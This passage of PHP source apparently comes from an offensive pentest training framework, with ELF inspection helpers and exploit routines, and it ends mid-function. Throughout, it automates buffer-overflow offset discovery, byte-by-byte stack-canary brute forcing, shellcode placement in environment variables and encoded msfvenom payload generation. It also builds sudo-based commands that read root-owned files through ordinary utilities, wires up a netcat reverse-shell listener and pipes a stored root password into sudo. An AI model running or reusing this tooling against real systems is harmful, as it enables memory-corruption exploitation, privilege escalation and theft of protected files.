	$this->titre("Size DTORS section");
	$this->titre("Via Size");
	$this->requette("size -Ax $this->file_path | grep '\.dtors' | tail -2 | head -1");
	exec("size -Ax $this->file_path | grep '\.dtors' | tail -2 | head -1 | sed \"s/.got//g\" | sed \"s/  //g\" | cut -d' ' -f2", $tmp1);
	exec("size -Ax $this->file_path | grep '\.dtors' | tail -2 | head -1 | sed \"s/.got//g\" | sed \"s/  //g\" | cut -d' ' -f3", $tmp2);
	$elf2addr4tmp = sprintf("%x", $tmp2 [0] + $tmp1 [0]);
	echo "\n\tZone TEXT: start: $tmp2[0] (Size: $tmp1[0]) end: 0x$elf2addr4tmp\n";
	$this->titre("Via ReadElf");$this->requette("readelf -e $this->file_path | grep '.got' -m1 | tail -1");
	$this->titre("Via Objdump");$this->requette("objdump -h $this->file_path | grep '.got' | tail -2 | head -1");
	$this->titre("Via GDB");$this->requette("gdb -q --batch -ex 'maintenance info section .dtors' $this->file_path | tail -1");
	return $this->hex2norme_32("0x$addr_tmp");
	}
	
	public function elf2got2size() {
	$this->titre("Size GOT section");
	$this->titre("Via Size");
	$this->requette("size -Ax $this->file_path | grep '.got' | tail -2 | head -1");
	exec("size -Ax $this->file_path | grep '.got' | tail -2 | head -1 | sed \"s/.got//g\" | sed \"s/  //g\" | cut -d' ' -f2", $tmp1);
	exec("size -Ax $this->file_path | grep '.got' | tail -2 | head -1 | sed \"s/.got//g\" | sed \"s/  //g\" | cut -d' ' -f3", $tmp2);
	$elf2addr4tmp = sprintf("%x", $tmp2 [0] + $tmp1 [0]);
	echo "\n\tZone TEXT: start: $tmp2[0] (Size: $tmp1[0]) end: 0x$elf2addr4tmp\n";
	$this->titre("Via ReadElf");$this->requette("readelf -e $this->file_path | grep '.got' -m1 | tail -1");
	$this->titre("Via Objdump");$this->requette("objdump -h $this->file_path | grep '.got' | tail -2 | head -1");
	$this->titre("Via GDB");$this->requette("gdb -q --batch -ex 'maintenance info section .got' $this->file_path | tail -1");
	}
	public function elf2offset4eip($argv_before,$overflow,$argv_after) {
	$this->titre("Find Offset");
	$overflow = $overflow+10;
	$query2 = "gdb --batch -q -ex \"r $argv_before `perl $this->dir_tools/bof/pattern.pl $overflow` $argv_after\" -ex \"i r eip\" $this->file_path | tail -1 | cut -d'x' -f3 | grep -Po \"[0-9a-fA-F]{7,8}\" ";
	$tmp = trim($this->req_ret_str($query2));
	$query3 = "perl $this->dir_tools/bof/pattern.pl 0x$tmp | tail -1 | grep -Po \"[0-9]{1,9}\"";
	$tmp2 = trim($this->req_ret_str($query3));
	// $this->titre("Methode 2");$this->requette("python $this->dir_tools/bof/136-checkfault-segfault-offset.py arg $this->file_path $overflow");$this->pause();
	return $tmp2 ;
	}
	
	function elf2offset4gdb($argv,$argv2,$deb, $fin)	{
	    
	    $bingo = $deb+1;
	    if($bingo == $fin) { 
	        $check = rand(41, 59);
	        $requette = "gdb -q --batch $this->file_path  -ex \"r $argv `python -c 'print \"\x$check\"*$deb'` $argv2\" | grep  'Program received signal' ";
	        exec($requette, $tmp_resu);
	        
	        if (empty($tmp_resu)) {   echo "\t\033[32;1mOFFSET CRASH\033[0m ->  \033[33;1m$deb\033[0m chars\n"; return $deb;}
	        else {   echo "\t\033[32;1mOFFSET CRASH\033[0m ->  \033[33;1m$fin\033[0m chars\n"; return $fin;}
	        
	    }
	    while($deb<= $fin){
	        $milieu = (int)($deb+$fin)/2;   
	        $this->ssTitre("DICHOTOMIC SEARCH $deb-$milieu-$fin");
	        for($overflow = 14;;) {
	            $check = rand(41, 59);
	        $requette = "gdb -q --batch $this->file_path  -ex \"r $argv `python -c 'print \"\x$check\"*$milieu'` $argv2\" | grep  'Program received signal' ";
	        exec($requette, $tmp_resu);
	        if (empty($tmp_resu)) {   return $this->elf2offset4gdb($argv,$argv2,$milieu, $fin);    }
	        if (!empty($tmp_resu)) {return $this->elf2offset4gdb($argv,$argv2,$deb, $milieu); }
	       
	        }
	        
	    }

	}
	
	public function elf2ssp4bruteforce4value($offset_ssp){
		$this->ssTitre(__FUNCTION__);
		$flag_1 = false ;
		$value_1 = "";
		$flag_2 = false ;
		$value_2 = "";
		$flag_3 = false ;
		$value_3 = "";
		$flag_4 = false ;
		$value_4 = "";
		/*
		for($i=0;$i<256 && !$flag_1;$i++){
			$argv = "\$(python -c 'print \"A\"*$offset_ssp+\"\\x".dechex($i)."\"')";
			if (!$this->elf2ssp4check($argv)) {$flag_1=true;$value_1= "\\x".dechex($i)."";$this->article("Value 1",$value_1);}
		}
		*/
		$value_1 = "\\x00";
		
		for($i=0;$i<256 && !$flag_2;$i++){
			$argv = "\$(python -c 'print \"A\"*$offset_ssp+\"$value_1\"+\"\\x".dechex($i)."\"')";
			if (!$this->elf2ssp4check($argv)) {$flag_2=true;$value_2= "\\x".dechex($i)."";$this->article("Value 2",$value_2);}
		}
		for($i=0;$i<256 && !$flag_3;$i++){
			$argv = "\$(python -c 'print \"A\"*$offset_ssp+\"$value_1\"+\"$value_2\"+\"\\x".dechex($i)."\"')";
			if (!$this->elf2ssp4check($argv)) {$flag_3=true;$value_3= "\\x".dechex($i)."";$this->article("Value 3",$value_3);}
		}
		for($i=0;$i<256 && !$flag_4;$i++){
			$argv = "\$(python -c 'print \"A\"*$offset_ssp+\"$value_1\"+\"$value_2\"+\"$value_3\"+\"\\x".dechex($i)."\"')";
			if (!$this->elf2ssp4check($argv)) {$flag_4=true;$value_4= "\\x".dechex($i)."";$this->article("Value 4",$value_4);}
		}
		$ssp = "0x$value_1$value_2$value_3$value_4";
		$this->article("SSP",$ssp);
		return $this->hex2rev_32($ssp);
	}
	
	public function elf2ssp4check($argv){
		$query = "unbuffer bash -c \"$this->file_path '$argv' 2>&1 | grep -i 'stack smashing detected'  \" ";
		$check = $this->req_ret_str($query);
		if (!empty($check)) return true; else return false;
	}
	
	public function elf2ssp4offset($min,$max){
		$this->ssTitre("Iter search for SSP OFFSET");
		$flag = false ;
		for($i=$min;$i<=$max && !$flag;$i++){
			$argv = "\$(python -c 'print \"A\"*$i')";
		if ($this->elf2ssp4check($argv)) {$this->article("OFFSET SSP",$i-1);$flag=true;return $i-1;}
		}
	}
	
	
	public function elf2offset4reg($reg) {
	$this->titre("Find Offset $reg");
	$overflow = linux_prog_fuzzeling();
	$query2 = "gdb --batch -q -ex \"r `python $this->dir_tools/bof/pattern.py create $overflow`\" -ex \"i r $reg\" $this->file_path | tail -1 | cut -d'x' -f3 | grep -Po \"[0-9a-fA-F]{7,8}\" ";
	$tmp = trim($this->req_ret_str($query2));
	$query3 = "python $this->dir_tools/bof/pattern.py offset $tmp $overflow | tail -1";
	$tmp2 = trim($this->req_ret_tab($query3));
	// $this->titre("Methode 2");$this->requette("python $this->dir_tools/bof/136-checkfault-segfault-offset.py arg $this->file_path $overflow");$this->pause();
	return $tmp2;
	}
	
	
	public function elf2size_text_data_bss_stack_heap() {
	$this->os2aslr4no();
	$this->article("OS partage Memoire", "La plupart des systèmes d’exploitation partage la mémoire en deux espaces mémoires disjoints :
L’espace utilisateur s’étend de 0x00000000 à 0xBFFFFFFF -> plus precisement from start 0x08048000 end 0xBFFFFFFF
L’espace noyau allant de 0xC0000000 à 0xFFFFFFFF ");
	$this->article("Zones", "
	Stack: parameters and dynamic local variables
	Heap: dynamically created data structures (malloc)
	BSS: uninitialized global and uninitialized static local variables
	Data: initialized global and initialized static local variables
	Text: readonly program code (elle contient les opcodes - code machine - du programme a executer)");
	$this->pause();
	$this->img("$this->dir_img/bof/memory_layouts_linux.png");
	$this->pause();
	$this->bin2text2size();$this->pause();
	$this->bin2data2size();$this->pause();
	$this->bin2bss2size();$this->pause();
	$this->elf2stack2size();$this->pause();
	$this->elf2heap2size();$this->pause();
	}
	public function elf2stack2size() {
	$this->titre("Stack");
	$this->requette("echo \"b main\\nr AAAA\\ninfo proc mappings\" > $this->file_dir/cmd_gdb.txt");
	$this->requette("gdb --batch -q -x $this->file_dir/cmd_gdb.txt $this->file_path | grep \"stack\" | tail -1");
	}
	public function elf2stack2start($argv) {
	$this->titre("Stack Start");
	$this->requette("echo \"b main\\nr $argv\\ninfo proc mappings\" > $this->file_dir/cmd_gdb.txt");
	$tmp = $this->req_ret_tab("gdb --batch -q -x $this->file_dir/cmd_gdb.txt $this->file_path | grep \"stack\" | tail -1 | cut -d' ' -f1");
	return $this->hex2norme_32(trim($tmp [0]));
	}
	public function elf2stack2end($argv) {
	$this->titre("Stack End");
	$this->requette("echo \"b main\\nr $argv\\ninfo proc mappings\" > $this->file_dir/cmd_gdb.txt");
	$tmp = $this->req_ret_tab("gdb --batch -q -x $this->file_dir/cmd_gdb.txt $this->file_path | grep \"stack\" | tail -1 | cut -d' ' -f2");
	return $this->hex2norme_32(trim($tmp [0]));
	}
	public function elf2heap2size($argv) {
	$this->titre("HEAP");
	$this->requette("echo \"b free\\nr \$($argv)\\ninfo proc mappings\" > $this->file_dir/cmd_gdb.txt");
	$this->requette("gdb --batch -q -x $this->file_dir/cmd_gdb.txt $this->file_path 2>&1 | grep \"\[heap\]\" | tail -1");
	}
	
	
	public function elf2dll() {
	$this->titre("Find Shared/dynamic library ");
	$this->requette("file $this->file_path");
	$this->titre("List de tous les libraries on Host");
	$this->cmd("localhost", "echo '$this->root_passwd' | sudo -S ldconfig -p");
	$this->pause();
	$this->titre("Shared library");
	$this->requette("readelf -l  $this->file_path");
	$this->requette("readelf -r  $this->file_path");
	$this->elf2ltrace("","");
	$this->elf2strace("","| grep lib");
	$this->requette("ldd -v $this->file_path");
	$this->requette("lddtree -a $this->file_path");
	// $this->requette("objcopy $this->file_path");
	// $this->requette("objdump $this->file_path");
	$this->requette("gdb -q --batch $this->file_path -ex \"r \" -ex \"info sharedlibrary\" ");
	$this->requette("gdb -q --batch $this->file_path -ex \"b main\" -ex \"r `python -c 'print \"AAAA\"'`\" -ex \"info proc mappings\"  ");
	$this->elf2sections();
	
	}
	public function elf2sections4dynamic() {
	$this->ssTitre(__FUNCTION__);
	$this->requette("gdb -q --batch -ex 'b main' -ex 'r AAAA' -ex \"info files\" $this->file_path");
	}
	
	public function elf2ltrace($run) {
	    $this->ssTitre(__FUNCTION__);
	    return $this->req_ret_str("ltrace $this->file_path $run 2>&1  ");
	}
	
	public function elf2mtrace($argv) {
	    $this->ssTitre(__FUNCTION__);
	    return $this->req_ret_str("mtrace $this->file_path $argv 2>&1 ");
	}
	public function elf2strace($argv) {
	    $this->ssTitre(__FUNCTION__);
	    return $this->req_ret_str("strace -s 999 -v -f $this->file_path $argv 2>&1 ");
	}
	
	public function elf2sections4all2start() {
	$this->ssTitre(__FUNCTION__);
	return $this->req_ret_tab("gdb -q --batch -ex 'b main' -ex 'r AAAA' -ex \"info files\" $this->file_path | grep 'is' | cut -d'-' -f1 | grep -Po \"0x[0-9a-f]{7,8}\" ");
	}
	
	public function elf2sections() {
	$this->ssTitre(__FUNCTION__);
	$this->elf2sections4static();
	$this->elf2sections4dynamic();
	}
	
	public function elf2sections4static() {
	$this->ssTitre(__FUNCTION__);
	$this->requette("readelf -S $this->file_path");
	}
	
	public function elf2sections4extract($section) {
	    $this->ssTitre(__FUNCTION__);
	    $section = trim($section);
	    $this->requette("objcopy -only-section=.$section $this->file_path $this->file_path.$section ");
	}
	
	public function elf2fonctions() {
	$this->bin2fonctions();
	$this->requette("readelf -a $this->file_path | grep '@@GLIBC'");
	$this->requette("objdump -tT $this->file_path ");
	$this->elf2fonctions_externes();
	$this->elf2fonctions_internes();
	}
	public function elf2fonctions_externes() {
	$this->titre("find Functions Extern");
	return $this->req_ret_tab("gdb -q --batch -ex \"info functions\" $this->file_path | grep '@' ");
	}
	public function elf2fonctions_internes() {
	$this->titre("find Functions Inside");
	return $this->req_ret_tab("gdb -q --batch -ex \"info functions\" $this->file_path | grep -v '@' ");
	}
	public function elf2mem_start() {
	$this->titre("Memory Allocation Prog Start");
	$query = "gdb -q --batch -ex 'info file' $this->file_path | grep '\.interp' | cut -d'-' -f1 ";
	$tmp = $this->req_ret_tab($query);
	$prog_mem_start = trim($tmp [0]);
	return $prog_mem_start;
	}
	public function elf2mem_end() {
	$this->titre("Memory Allocation Prog End");
	$query = "gdb -q --batch -ex 'info file' $this->file_path | grep '\.bss' | cut -d'-' -f2 | grep -Po \"0x[0-9a-f]{7,8}\"";
	$tmp = $this->req_ret_tab($query);
	$prog_mem_end = trim($tmp [0]);
	return $prog_mem_end;
	}
	public function elf2mem() {
	$this->titre("Memory Allocation Prog");
	$this->requette("readelf -d $this->file_path");
	$this->pause();
	$this->requette("gdb -q --batch -ex 'info file' $this->file_path");
	$start = $this->elf2mem_start();
	$end = $this->elf2mem_end();
	return array (
	$start,
	$end
	);
	}
	
	
	public function elf2addr4shellcode2env($nops,$shellcode_hex) {
	    $this->shellcode2env4hex($nops, $shellcode_hex);
	    $name = "getenv";
	    $this->requette("cp -v $this->dir_c/$name.c $this->file_dir/$name.c");
	    $c_code = file_get_contents("$this->file_dir/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
	    $file_c = new FILE("$this->file_dir/$name.c");
	    //$this->requette("gedit $file_c->file_path");
	    $name_prog = $file_c->file_c2elf("-ggdb -w -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
	    
	$query = "$name_prog shellcode $this->file_path";

	$elf2addr4ret = $this->req_ret_str($query);
	
	$this->article("SHELLCODE ADDR IN ENV VAR", $elf2addr4ret);
	// elf2string4hex($elf2addr4ret,"979");
	// elf2opcode4hex($elf2addr4ret);
	/*
	 * $this->titre("Check If is Good Addr");
	 * $tmp = $this->req_ret_tab("gdb -q --batch -ex \"b main\" -ex \"r AAAA\" -ex \"x/100s $elf2addr4ret\" $this->file_path | grep shellcode | tail -1 | cut -d':' -f1 ");
	 * $elf2addr4ret = trim($tmp[0]);unset($tmp);
	 * $elf2addr4ret = dechex(hexdec($elf2addr4ret)+10); // 10 (shellcode=) +(nops)
	 * $elf2addr4ret = $this->hex2norme_32($elf2addr4ret);
	 * $this->article("ADDR Real SHELLCODE IN ENV VAR", $elf2addr4ret);
	 * elf2string4hex($elf2addr4ret,"979");
	 * elf2opcode4hex($elf2addr4ret);
	 * $this->requette("gdb -q --batch -ex \"b main\" -ex \"r AAAA\" -ex \"x/s $elf2addr4ret\" $this->file_path | tail -1 ");
	 * $this->pause();
	 */
	
	return $elf2addr4ret;
	}
	
	public function elf2fmt_env_elf2addr4ret() {
	$name_prog = c2bin("getenv", "-m32");
	$query = "$name_prog fmt $this->file_path";
	$this->requette($query);
	exec($query, $tmp);
	$elf2addr4ret = trim($tmp [0]);
	$this->article("FORMAT String ADDR IN ENV VAR", $elf2addr4ret);
	// elf2string4hex($elf2addr4ret,"979");
	// elf2opcode4hex($elf2addr4ret);
	/*
	 * $this->titre("Check If is Good Addr");
	 * $tmp = $this->req_ret_tab("gdb -q --batch -ex \"b main\" -ex \"r AAAA\" -ex \"x/100s $elf2addr4ret\" $this->file_path | grep shellcode | tail -1 | cut -d':' -f1 ");
	 * $elf2addr4ret = trim($tmp[0]);unset($tmp);
	 * $elf2addr4ret = dechex(hexdec($elf2addr4ret)+10); // 10 (shellcode=) +(nops)
	 * $elf2addr4ret = $this->hex2norme_32($elf2addr4ret);
	 * $this->article("ADDR Real SHELLCODE IN ENV VAR", $elf2addr4ret);
	 * elf2string4hex($elf2addr4ret,"979");
	 * elf2opcode4hex($elf2addr4ret);
	 * $this->requette("gdb -q --batch -ex \"b main\" -ex \"r AAAA\" -ex \"x/s $elf2addr4ret\" $this->file_path | tail -1 ");
	 * $this->pause();
	 */
	
	return $elf2addr4ret;
	}
	
	public function elf4shellcode($exec,$badchar) { 
	$this->requette( "msfvenom --payload linux/x86/exec cmd=\"$exec\" --arch x86 --platform linux --encoder x86/shikata_ga_nai --iterations 1 --bad-chars '$badchar' --format c > $this->file_dir/$this->file_name.shellcode ");
	$this->requette( "echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local $this->file_dir/$this->file_name.shellcode ");
	return new file("$this->file_dir/$this->file_name.shellcode");
	}
	
	public function elf2hex() { // ne donne rien de concluant
	$this->titre( "ELF to HEX");
	return trim($this->req_ret_str( "objdump -M intel --section=.text -d $this->file_path | egrep '[0-9a-fA-F]{7,8}:' | grep -v 'file' | cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\\x/g' | paste -d '' -s | sed 's/^/\"/' | sed 's/$/\"/g' | sed 's/\"//g' "));
	}
	

	public function elf2info() {
	// net("http://en.wikibooks.org/wiki/Grsecurity/Additional_Utilities");
	// $this->requette("/sbin/paxctl --help $this->file_path");
	$this->requette("/sbin/paxctl -v $this->file_path");
	//$this->titre("Check Security On OS");
	//if (! file_exists("/opt/paxtest-0.9.14/execstack")) $this->install_labs_paxtest();
	//$this->cmd("localhost","cd /opt/paxtest-0.9.14;sh ./paxtest blackhat ");	$this->pause();
	// $this->requette("dumpelf $this->file_path"); $this->pause();
	//$this->requette("binwalk -Me $this->file_path");
	//$this->requette("cd $this->file_dir; perf record -g -- ./$this->file_name AAAA ; perf script | c++filt | gprof2dot -f perf > $this->file_dir/$this->file_name.perf.dot; xdot $this->file_dir/$this->file_name.perf.dot");
	$this->file_file2info();
	$this->file_file2stat();
	$this->file_file2metadata();
	//$this->elf2sections();
	//$this->elf2fonctions();
	}
	
	
	
	public function  elf2addr4env($id) {
	$env_file = "$this->file_dir/getenv.c";
	$env_bin = "$this->file_dir/getenv.elf";
	if (!file_exists($env_file)){
	system("cp -v $this->dir_c/getenv.c $env_file");
	}
	
	
	if (!file_exists($env_bin)){
	    $bin = new file($env_file);
	$bin->file_c2elf("-m32");
	}
	$query = "$env_bin $id $this->file_path";
	$elf2addr4ret = trim($this->req_ret_str($query));
	$elf2addr4ret = trim($this->hex2norme_32($elf2addr4ret));
	$this->article("$id ADDR IN ENV VAR", $elf2addr4ret);
	// elf2string4hex($elf2addr4ret,"979");
	// elf2opcode4hex($elf2addr4ret);
	/*
	 * $this->titre("Check If is Good Addr");
	 * $tmp = $this->req_ret_tab("gdb -q --batch -ex \"b main\" -ex \"r AAAA\" -ex \"x/100s $elf2addr4ret\" $this->file_path | grep shellcode | tail -1 | cut -d':' -f1 ");
	 * $elf2addr4ret = trim($tmp[0]);unset($tmp);
	 * $elf2addr4ret = dechex(hexdec($elf2addr4ret)+10); // 10 (shellcode=) +(nops)
	 * $elf2addr4ret = $this->hex2norme_32($elf2addr4ret);
	 * $this->article("ADDR Real SHELLCODE IN ENV VAR", $elf2addr4ret);
	 * elf2string4hex($elf2addr4ret,"979");
	 * elf2opcode4hex($elf2addr4ret);
	 * $this->requette("gdb -q --batch -ex \"b main\" -ex \"r AAAA\" -ex \"x/s $elf2addr4ret\" $this->file_path | tail -1 ");
	 * $this->pause();
	 */
	
	return $elf2addr4ret;
	}
	
	
	public function elf2addr4fonction_prog($fonction) {
	$fonction = trim($fonction);
	$this->titre("ADDR FUNCTION $fonction");
	$query = "gdb --batch -q -ex \"r AAAA\" -ex \"x/x $fonction\" $this->file_path | grep -i '<$fonction>' ";
	$filtre = " | tail -1 | cut -d'x' -f2 | cut -d' ' -f1 ";
	$this->requette($query);
	$fonction_addr = trim($this->req_ret_str($query . $filtre));
	$fonction_addr = trim($this->hex2norme_32($fonction_addr));
	$this->elf2symbol4hex($fonction_addr);
	$this->article("&$fonction", $fonction_addr);
	return $fonction_addr;
	}
	
	
	

	public function elf2bss2size() {
	$this->bin2bss2size();
	$this->titre("Via ReadElf");$this->requette("readelf -e $this->file_path | grep \"\.bss \" ");
	$this->titre("Via GDB");$this->requette("gdb -q --batch -ex 'maintenance info section .bss' $this->file_path");
	}
	

	public function elf2data2size() {
	$this->bin2data2size();
	$this->titre("Via ReadElf");$this->requette("readelf -e $this->file_path | grep \"\.data\" | tail -1");
	$this->titre("Via GDB");$this->requette("gdb -q --batch -ex 'maintenance info section .data' $this->file_path | tail -1");
	}

	public function elf2text2size() {
	$this->bin2text2size();
	$this->ssTitre("Via ReadElf");$this->requette("readelf -e $this->file_path | grep '.text' -m1");
	$this->ssTitre("Via GDB");$this->requette("gdb -q --batch -ex 'maintenance info section .text' $this->file_path | tail -1");
	}
	
	public function elf2bss2start() {
	$this->ssTitre("BSS for $this->file_path");
	$bss = $this->hex2norme_32(trim($this->req_ret_str("gdb -q --batch -ex 'info files' $this->file_path | grep -i '\.bss' | cut -d '-' -f1 | grep -Po \"0x[0-9a-f]{6,8}\" ")));
	$this->article("BSS",$bss);
	return $bss ;
	}
	
	public function elf2data2start() {
	$this->ssTitre("DATA for $this->file_path");
	$bss = $this->hex2norme_32(trim($this->req_ret_str("gdb -q --batch -ex 'info files' $this->file_path | grep -i '\.data' | cut -d '-' -f1 | grep -Po \"0x[0-9a-f]{6,8}\" ")));
	$this->article("DATA",$bss);
	return $bss ;
	}
	
	
	public function elf2section2start($section) {
	$section = trim($section);
	$this->ssTitre("$section for $this->file_path");
	$section_start = $this->hex2norme_32(trim($this->req_ret_str("gdb -q --batch -ex 'info files' $this->file_path | grep -i '\.$section' | cut -d '-' -f1 | grep -Po \"0x[0-9a-f]{6,8}\" ")));
	$this->article("Section $section start at",$section_start);
	return $section_start ;
	}
	
	
	public function elf2bss2start4ld() {
	$this->ssTitre("BSS for LD");
	$dlls = $this->elf2dlls();
	$bss = $this->hex2norme_32(trim($this->req_ret_str("gdb -q --batch -ex 'b main' -ex 'r AAAA' -ex 'info files' $this->file_path | grep -i '\.bss' | grep 'ld-linux.so' | cut -d '-' -f1 | grep -Po \"0x[0-9a-f]{6,8}\" ")));
	$this->article("BSS",$bss);
	return $bss ;
	}
	
	public function elf2data2start4ld() {
	$this->ssTitre("DATA from LD");
	$dlls = $this->elf2dlls();
	$bss = $this->hex2norme_32(trim($this->req_ret_str("gdb -q --batch -ex 'b main' -ex 'r AAAA' -ex 'info files' $this->file_path | grep -i '\.data' | grep 'ld-linux.so' | cut -d '-' -f1 | grep -Po \"0x[0-9a-f]{6,8}\" ")));
	$this->article("DATA",$bss);
	return $bss ;
	}
	
	public function elf2bss2start4libc() {
	$this->ssTitre("BSS from Libc");
	$dlls = $this->elf2dlls();
	$bss = $this->hex2norme_32(trim($this->req_ret_str("gdb -q --batch -ex 'b main' -ex 'r AAAA' -ex 'info files' $this->file_path | grep -i '\.bss' | grep 'libc.so' | cut -d '-' -f1 | grep -Po \"0x[0-9a-f]{6,8}\" ")));
	$this->article("BSS",$bss);
	return $bss ;
	}

	public function elf2data2start4libc() {
	$this->ssTitre("DATA for Libc");
	$dlls = $this->elf2dlls();
	$bss = $this->hex2norme_32(trim($this->req_ret_str("gdb -q --batch -ex 'b main' -ex 'r AAAA' -ex 'info files' $this->file_path | grep -i '\.data' | grep 'libc.so' | cut -d '-' -f1 | grep -Po \"0x[0-9a-f]{6,8}\" ")));
	$this->article("DATA",$bss);
	return $bss ;
	}
	
	public function elf2text2content() {
	$this->bin2section4text();
	$this->ssTitre("Source Code/C display");$this->requette("gdb -q --batch -ex \"list\" $this->file_path");$this->pause();
	}
	
	
	
	
	public function elf2offset4eip_integer($argv1, $overflow) {
	$this->titre("Find Offset");
	$query2 = "gdb --batch -q -ex \"r $argv1 `python $this->dir_tools/bof/pattern.py create $overflow`\" -ex \"i r eip\" $this->file_path | tail -1 | cut -d'x' -f3";
	$tmp = $this->req_ret_tab($query2);
	$query3 = "python $this->dir_tools/bof/pattern.py offset $tmp[0] | tail -1";
	$tmp2 = $this->req_ret_tab($query3);
	return $tmp2 [0];
	}
	public function elf2offset4eip_server($overflow, $host, $port) {
	$this->titre("Find Offset");
	$this->requette("echo `python $this->dir_tools/bof/pattern.py create $overflow` | nc $host $port -v");
	$prog = trim(basename($this->file_path));
	$tmp = $this->req_ret_tab("dmesg | tail -1 | grep $prog | grep tcpserver | grep -Po \"segfault at [0-9a-f]{6,8}\" | grep -Po \"[0-9a-f]{6,8}\" ");
	$query3 = "python $this->dir_tools/bof/pattern.py offset $tmp[0] | tail -1";
	$tmp2 = $this->req_ret_tab($query3);
	return $tmp2 [0];
	}
	// ################################### BUFFER OVERFLOW ##########################################################
	/*
	 * $this->titre("Memoire d'un processus");
	 * $this->titre("allocation memoire des differentes variables qui composent le processus");
	 * //$this->img("bof/memore_vive_processus.png"); $this->pause();
	 * // start 0xBFFFFFFF end 0x08048000
	 * $this->pause();
	 * //$this->img("bof/linuxFlexibleAddressSpaceLayout.png");$this->pause();
	 * //$this->img("bof/mem_2.png");$this->pause();
	 * //$this->img("bof/mem_0.png");$this->pause();
	 * os2aslr4no();
	 * $this->requette("cat /proc/`sudo ps aux | grep \"/bin/cat\" | head -1 | sed \"s/ / /g\" | cut -d' ' -f4`/maps | grep stack");
	 * $this->requette("cat /proc/self/maps | grep stack");
	 * $this->pause();
	 * os2aslr4yes();
	 * $this->requette("cat /proc/`sudo ps aux | grep \"/bin/cat\" | head -1 | sed \"s/ / /g\" | cut -d' ' -f4`/maps | grep stack");
	 * $this->requette("cat /proc/self/maps | grep stack");
	 * $this->pause();
	 * //$this->img("bof/mem_3.png");$this->pause();
	 * if (!file_exists("$this->file_dir/structure_memoire_processus")) $this->file_path = c2bin("structure_memoire_processus","");
	 * else $this->file_path = "$this->file_dir/structure_memoire_processus";
	 */
	
	
	
	public function elf2contenu_text_data_bss_stack_heap() {
	$this->titre("Contenu des Sections  .stack .heap .text .data .bss");
	$this->bin2text2content();$this->pause();
	$this->bin2data2content();$this->pause();
	$this->bin2bss2content();$this->pause();
	$this->bin2content_strings("");$this->pause();
	}


	

	public function elf4root2read($sudo,$userpass,$file2read){
	    $this->ssTitre(__FUNCTION__);
	    $file2read = trim($file2read);

	    $via_sudo = "echo '$userpass' | sudo -S ";
	    $data = "";
	    $data_sudo = "";
	    $data_rst = "";

	    $opt_before = "";
	    $opt_after = "";
	    
	    switch ($this->file_name){
	        case "arp":
	            $opt_before = "-v -f ";
	            $opt_after = "";
	            break ;
	            
	            
	        case "base64":
	            $opt_before = "";
	            $opt_after = " | base64 --decode";
	            break ;
	            	            
	        case "cancel":
	            $opt_before = "-u \"\$(cat ";
	            $opt_after = ")\"";
	            break ;
	            
	        case "cat":
	            $opt_before = "";
	            $opt_after = "";
	            break ;
	            
	        case "chmod":
	            $opt_before = "0777 ";
	            $opt_after = "";
	            break ;
	            
	        case "chown":
	            $opt_before = "\$(id -un):\$(id -gn) ";
	            $opt_after = "";
	            break ;
	            
	            
	        case "cp":
	            $opt_before = "";
	            $opt_after = "";
	            break ;
	            
	        case "cut":
	            $opt_before = "-d'' -f1 ";
	            $opt_after = "";
	            break ;
	            
	            
	        case "date":
	            $opt_before = "-f ";
	            $opt_after = "";
	            break ;
	            
	        case "dd":
	            $opt_before = "-if=";
	            $opt_after = "";
	            break ;
	            
	        case "diff":
	            $opt_before = "--line-format=%L /dev/null ";
	            $opt_after = "";
	            break ;
	            
	        case "expand":
	            $opt_before = "";
	            $opt_after = "";
	            break ;
	            
	        case "file":
	            $opt_before = "-m ";
	            $opt_after = "";
	            break ;
	            
	        case "fmt":
	            $opt_before = "-pNON_EXISTING_PREFIX ";
	            $opt_after = "";
	            break ;
	            
	        case "fold":
	            $opt_before = "-w99999999 ";
	            $opt_after = "";
	            break ;
	            
	        case "grep":
	            $opt_before = "'' ";
	            $opt_after = "";
	            break ;
	            
	        case "head":
	            $opt_before = "-c1G ";
	            $opt_after = "";
	            break ;
	            
	        case "ip":
	            $opt_before = "-force -batch ";
	            $opt_after = "";
	            break ;
	            
	        case "jq":
	            $opt_before = "-Rr . ";
	            $opt_after = "";
	            break ;
	            
	        case "mtr":
	            $opt_before = "--raw -F ";
	            $opt_after = "";
	            break ;
	            
	        case "nl":
	            $opt_before = "-bn -w1 -s '' ";
	            $opt_after = "";
	            break ;
	            
	        case "od":
	            $opt_before = "-An -c -w9999 ";
	            $opt_after = "";
	            break ;
	            
	        case "pg":
	            $opt_before = "";
	            $opt_after = "";
	            break ;
	            
	        case "readelf":
	            $opt_before = "-a @";
	            $opt_after = "";
	            break ;
	            
	        case "run-mailcap":
	            $opt_before = "--action=view ";
	            $opt_after = "";
	            break ;	            
	            
	        case "shuf":
	            $opt_before = "-e DATA -o ";
	            $opt_after = "";
	            break ;	            
	            
	        case "sort":
	            $opt_before = "-m ";
	            $opt_after = "";
	            break ;
	            
	        case "tail":
	            $opt_before = "-c1G ";
	            $opt_after = "";
	            break ;	            
	            
	        case "ul":
	            $opt_before = "";
	            $opt_after = "";
	            break ;
	            
	        case "uniq":
	            $opt_before = "";
	            $opt_after = "";
	            break ;
	            
	        case "xxd":
	            $opt_before = "";
	            $opt_after = " | xxd -r ";
	            break ;
	            
	    }
	    
	    $data = "$this->file_path $opt_before$file2read$opt_after ";
	    $data_sudo = "$via_sudo $data";
	    
	    if($sudo) $data_rst = $data_sudo ;
	    else $data_rst = $data ;
	    

	    return $data_rst ;
	}

	
	public function elf2lan($attacker_ip,$attacker_port,$attacker_protocol,$shell,$time,$info,$cmd_nc_rev){
	    $this->ssTitre(__FUNCTION__);
	    $eth = $this->ip4eth4target($attacker_ip);
	    $cmd1 = "php pentest.php LAN \"'$eth' 'localhost.local' '$attacker_ip' '$attacker_port' 'T' '$attacker_port' '$attacker_protocol' '$info' 'server' '100'\" ";
	    $this->article("CMD1", $cmd1);
	    $this->article("CMD2", $cmd_nc_rev);
	    $this->cmd("localhost",$cmd_nc_rev);
	    $this->exec_parallel_proc($cmd1, $cmd_nc_rev, $time);
	    $this->pause();
	}

	public function elf4root2cmd($target_ip,$attacker_port,$shell,$sudo,$userpass,$cmd){
	    $this->ssTitre(__FUNCTION__);
	    $target_ip = trim($target_ip);
